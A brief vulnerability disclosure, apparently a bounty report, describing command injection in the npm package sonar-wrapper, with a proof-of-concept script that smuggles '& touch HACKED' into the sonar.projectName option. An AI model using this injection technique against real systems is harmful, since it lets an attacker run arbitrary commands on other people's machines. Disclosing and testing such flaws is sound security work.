# Description

Command Injection in sonar-wrapper

# Proof of Concept

1. Create the following PoC file:

```
// poc.js
var sw = require("sonar-wrapper");
var options= {'sonar.projectName':'& touch HACKED'};
sw.runAnalisys('./',options, []);
```

2. Execute the following commands in terminal:

```
npm i sonar-wrapper # Install affected module
node poc.js #  Run the PoC
```

3. Check the Output using ls command before and after the execution.
